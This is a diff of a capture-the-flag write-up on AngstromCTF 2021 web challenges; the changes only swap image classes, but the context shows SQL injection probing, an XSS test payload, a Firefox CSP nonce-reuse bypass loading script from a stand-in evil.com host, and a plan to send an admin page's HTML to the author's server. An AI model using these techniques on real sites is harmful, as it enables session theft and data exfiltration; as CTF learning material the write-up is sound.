@@ -159,7 +159,7 @@ We can certainly control all three of the inputs, with some limitations though.
 At this point, let's try some SQLi injections to see if there's something hidden in the database.
 Let's see what's in `sql_master`, maybe some hidden tables ?
 
-![angstrom_ctf](/assets/img/AngstromCTF_2021/web_2.jpeg){: .image-full }
+![angstrom_ctf](/assets/img/AngstromCTF_2021/web_2.jpeg){: .image-100 }
 
 ```html
 <ul class="list pl0">
@@ -476,9 +476,9 @@ So we know the bot uses `Firefox/89.0` as a browser. Let's try some basic script
 data = {"score" : "123", "name" : '<script>alert(1)</script>'}
 ```
 
-![angstrom_ctf](/assets/img/AngstromCTF_2021/web_4.jpeg){: .image-full }
+![angstrom_ctf](/assets/img/AngstromCTF_2021/web_4.jpeg){: .image-100 }
 Hmm, seems like the CSP is blocking our script's execution. This happens because we didn't provide a valid nonce for the script tag hence the browser refuses to execute it. After some research I found [this post](https://krial057.github.io/blog/own-xss-challenge) explaining why using `<script src=//evil.com/script.js` can work in our case. Basically, as the XSS sink point is printed on the page just before the valid `<script nonce={nonce}>` tag, if we inject `<script attr=value attr=value ...` without closing the tag, firefox reuses the nonce from the script tag situated immediately after our payload.
-![angstrom_ctf](/assets/img/AngstromCTF_2021/web_5.jpeg){: .image-full }
+![angstrom_ctf](/assets/img/AngstromCTF_2021/web_5.jpeg){: .image-100 }
 That's some good news for us as it gives us carte blanche on what we can execute on the bot's browser. We can use the following script to setup a form with a single input, set it's value to admin's page html document and send it back to our local server.
 
 ```python
